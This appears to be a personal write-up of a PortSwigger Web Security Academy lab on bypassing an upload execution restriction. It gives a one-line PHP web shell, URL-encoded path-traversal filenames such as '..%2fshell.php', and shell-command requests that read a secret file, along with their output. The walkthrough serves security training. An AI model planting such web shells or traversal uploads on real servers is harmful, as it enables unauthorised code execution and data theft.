
# #PortSwigger 


![[Pasted image 20251215203454.png]]


## Lab Description

> This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.
> 
> **Objective:** Upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.
> 
> - **Your credentials:** `wiener:peter`

---

## Step 1: Understanding the Vulnerability

**The path traversal flaw:**
- The server prevents PHP execution in the `/files/avatars/` directory
- However, we can upload files to a different directory using path traversal (`../`)
- The `/files/` directory (parent) allows PHP execution

**The attack:**
1. Upload a PHP web shell with `filename="../exploit.php"`
2. The server URL-decodes the filename
3. The file is saved to `/files/exploit.php` (outside the avatars directory)
4. PHP execution is enabled in `/files/`
5. Access the file -> code executes

---

## Step 2: Reconnaissance

### Step 2.1: Log In

1. Log in with `wiener:peter`
2. Go to **My account** page

![[Pasted image 20251215203715.png]]

### Step 2.2: Test PHP Upload (Upload Works but No Execution)

Upload `shell.php`:

**Response:** File uploaded successfully.

![[Pasted image 20251215203800.png]]

### Step 2.3: Test PHP Execution (Fails)

Access `/files/avatars/shell.php`:

**Response:** Plain text source code, not executed.

The server prevents PHP execution in `/files/avatars/` but allows uploads

![[Pasted image 20251215214848.png]]

---

## Step 3: Creating the PHP Web Shell

### Step 3.1: Create shell.php

```
<?php system($_GET['command']); ?>
```

### Step 3.2: Alternative Payload

```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

---

## Step 4: Path Traversal to Bypass Execution Restriction

### Step 4.1: Test Basic Path Traversal

Intercept the upload request and change the filename:
```
Content-Disposition: form-data; name="avatar"; filename="../shell.php"
```

**Response:**
```
The file avatars/shell.php has been uploaded.
```

The server stripped the `../` sequence.

### Step 4.2: Obfuscate with URL Encoding

URL encode the forward slash (`/` becomes `%2f`):
```
Content-Disposition: form-data; name="avatar"; filename="..%2fshell.php"
```

**Response:**
```
The file avatars/../shell.php has been uploaded.
```


The server URL-decoded the filename! The file was saved to `/files/shell.php`.

### Step 4.3: Alternative Encoding

You can also encode the dot (`.` becomes `%2e`):
```
filename="%2e%2e%2fshell.php"
```

![[Pasted image 20251215214918.png]]

![[Pasted image 20251215220532.png]]

---

## Step 5: Executing the Web Shell

### Step 5.1: Access the Uploaded File

The file is now at:
```
/files/shell.php
```

**Request:**
```
GET /files/shell.php?command=whoami HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

![[Pasted image 20251215220610.png]]

**Response**
```
carlos
```
PHP execution works in `/files/` directory!

![[Pasted image 20251215220733.png]]


### Step 5.2: List Home Directory

```
GET /files/shell.php?command=ls%20/home/carlos
```

**Response:**
```
secret
```

![[Pasted image 20251215220846.png]]

### Step 5.3: Read the Secret

```
GET /files/shell.php?command=cat%20/home/carlos/secret
```

![[Pasted image 20251215220928.png]]


---

## Step 6: Submitting the Secret

1. Go back to the lab page
2. Click **Submit solution**
3. Enter the secret: `Gavit3ls1Fh9cJfq7022yYJOFW3vzeZ`
4. Click **OK**

![[Pasted image 20251215220945.png]]


---

## Step 7: Lab Solved

Success message displayed:

![[Pasted image 20251215220958.png]]


---
---
